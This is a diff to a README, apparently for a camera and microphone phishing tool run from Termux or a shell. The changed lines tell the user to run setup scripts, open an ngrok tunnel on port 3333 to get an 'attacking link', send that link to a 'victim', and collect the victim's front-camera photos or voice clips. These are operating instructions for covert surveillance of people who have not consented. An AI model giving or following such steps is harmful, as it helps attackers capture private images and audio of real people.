@@ -99,7 +99,10 @@ $ bash setup.sh
 $ bash main_script.sh
 ```
 ### Important:-
-- If You Using Termux, You must on your `mobile data & wifi-hotspot`.Otherwise you can’t get the attacking link.
+- If You didn't get the link, follow this intructions
+ - 1.Open a new terminal or session
+ - 2.Type `./ngrok http 3333 `
+ - 3.Now you can see the link
 - After complete installation you will get the link.You can send it victim.
 - After victim open this link you can get victim’s front camera photos or voice clips.
 - When you think enough then you can stop it  `ctrl+c` 
